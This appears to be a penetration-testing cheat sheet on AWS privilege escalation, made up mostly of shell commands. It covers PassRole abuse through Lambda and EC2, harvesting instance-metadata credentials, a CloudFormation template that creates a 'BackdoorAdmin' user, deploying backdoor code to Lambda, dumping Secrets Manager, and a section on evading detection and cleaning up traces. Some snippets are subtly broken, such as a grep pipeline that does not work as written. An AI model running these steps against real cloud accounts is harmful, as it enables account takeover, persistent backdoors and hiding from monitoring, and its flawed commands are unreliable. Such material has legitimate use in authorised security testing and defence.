# AWS Privilege Escalation

Privilege escalation in AWS involves moving from a low-privileged identity to higher privileges within the same account or across accounts.

## IAM Permission Abuse

### Overpermissioned Users and Roles

```bash
# Check for users with administrative privileges
aws iam list-users --query 'Users[].[UserName]' -o tsv | while read user; do
  ADMIN=$(aws iam list-attached-user-policies --user-name "$user" \
    --query "AttachedPolicies[?PolicyName=='AdministratorAccess']" -o json)
  [ -n "$ADMIN" ] && echo "ADMIN: $user"
done

# Find inline policies with dangerous permissions
aws iam list-users --query 'Users[].UserName' -o tsv | while read user; do
  POLICIES=$(aws iam list-user-policies --user-name "$user" --query 'PolicyNames' -o tsv)
  for policy in $POLICIES; do
    POLICY_CONTENT=$(aws iam get-user-policy --user-name "$user" --policy-name "$policy" --query 'UserPolicyDocument')
    echo "$POLICY_CONTENT" | grep -q '"Effect":"Allow"' && grep -q '"Action":"*"' && echo "DANGEROUS: $user/$policy"
  done
done
```

### Privilege Escalation via AssumeRole

```bash
# If current identity can assume higher-privileged role
# List assumable roles
aws iam list-roles --query 'Roles[].AssumeRolePolicyDocument' -o json | \
  jq '.[] | select(.Statement[].Principal.AWS == "*" or .Statement[].Principal.Service != null)'

# Assume role
aws sts assume-role \
  --role-arn "arn:aws:iam::{accountId}:role/HigherPrivilegeRole" \
  --role-session-name "escalation"

# Export credentials
export AWS_ACCESS_KEY_ID={AccessKeyId}
export AWS_SECRET_ACCESS_KEY={SecretAccessKey}
export AWS_SESSION_TOKEN={SessionToken}

# Now have higher privileges
```

### PassRole Permission Exploitation

```bash
# If user has iam:PassRole permission, can create privileged resource

# Create Lambda function with high-privilege role
aws lambda create-function \
  --function-name privileged-function \
  --runtime python3.9 \
  --role "arn:aws:iam::{accountId}:role/AdministratorRole" \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://exploit.zip

# Lambda executes with administrator privileges
# Can access resources and modify configurations

# Or create EC2 instance with privileged profile
aws ec2 run-instances \
  --image-id ami-12345678 \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdministratorProfile

# SSH into instance and use metadata service
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdministratorProfile
```

## Cross-Account Privilege Escalation

### Trust Relationship Exploitation

```bash
# If current account trusted by higher-privileged account
# Can assume role in target account

# Get cross-account role ARN
aws sts get-caller-identity

# Find trust relationships
aws iam get-role --role-name {roleName} | jq '.Role.AssumeRolePolicyDocument'

# If principal is current account or current identity
# Can assume role

aws sts assume-role \
  --role-arn "arn:aws:iam::{targetAccountId}:role/CrossAccountRole" \
  --role-session-name "escalation"
```

## Service-Specific Escalation

### Lambda Execution Role Abuse

```bash
# Lambda may have more permissions than invoking user
# If can create/update Lambda function

aws lambda update-function-code \
  --function-name {functionName} \
  --zip-file fileb://backdoor.zip

# Function now executes backdoor code
# With Lambda execution role privileges

# Or invoke Lambda that exports data
# Function has access to resources invoking user doesn't
```

### EC2 Instance Profile Escalation

```bash
# If can launch EC2 instance
# Can attach high-privilege instance profile

aws ec2 run-instances \
  --image-id {imageId} \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdminProfile

# SSH to instance
# Access metadata service for credentials
```

### STS Session Token Manipulation

```bash
# If can create temporary credentials
# May be able to generate credentials with higher privileges

# Get session token
aws sts get-session-token \
  --duration-seconds 3600 \
  --serial-number arn:aws:iam::{accountId}:mfa/user

# May have limited restrictions on token use
# Depending on policy configuration
```

## CloudFormation/Infrastructure Exploitation

### Template Privilege Escalation

```bash
# If can execute CloudFormation templates
# Can create resources with any permissions

cat > exploit.yaml << 'EOF'
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  AdminUser:
    Type: AWS::IAM::User
    Properties:
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AdministratorAccess
      UserName: BackdoorAdmin
EOF

aws cloudformation create-stack \
  --stack-name exploit \
  --template-body file://exploit.yaml

# New admin user created
aws iam get-access-key-last-used \
  --access-key-id {accessKeyId} \
  --query 'AccessKeyLastUsed'
```

## SNS/SQS Resource Policy Exploitation

```bash
# Resource-based policies may allow privilege escalation

# Check SNS topic policy
aws sns get-topic-attributes \
  --topic-arn {topicArn} \
  --attribute-name Policy

# If policy allows PublishMessage to specific principal
# Can publish messages through that resource

# Or create resource with overpermissioned policy
aws sqs create-queue --queue-name escalation

# Set policy allowing all actions
aws sqs set-queue-attributes \
  --queue-url {queueUrl} \
  --attributes 'Policy={"Version":"2012-10-17","Statement":[{"Principal":"*","Effect":"Allow","Action":"sqs:*","Resource":"*"}]}'
```

## Secrets Manager Escalation

```bash
# If can read secrets, may find higher-privilege credentials

aws secretsmanager list-secrets

# Get secret value
aws secretsmanager get-secret-value \
  --secret-id {secretName} \
  --query 'SecretString'

# Parse for AWS credentials
# Use credentials for privilege escalation
```

## Detection Evasion

```bash
# Escalation often creates CloudTrail events

# Check who's doing the monitoring
aws cloudwatch list-alarms

# Some escalation actions may not generate alerts
# if CloudTrail not capturing them

# Use existing high-privilege credentials
# Rather than creating new resources

# Clean up created resources
aws iam delete-user --user-name BackdoorAdmin
aws lambda delete-function --function-name backdoor
```

## Key Findings

- Users with AdministratorAccess policy
- Inline policies granting wildcard actions
- Cross-account roles trusting current account
- Overpermissioned instance profiles
- Lambda functions with high-privilege execution roles
- Service role PassRole permissions
- Overpermissioned resource-based policies
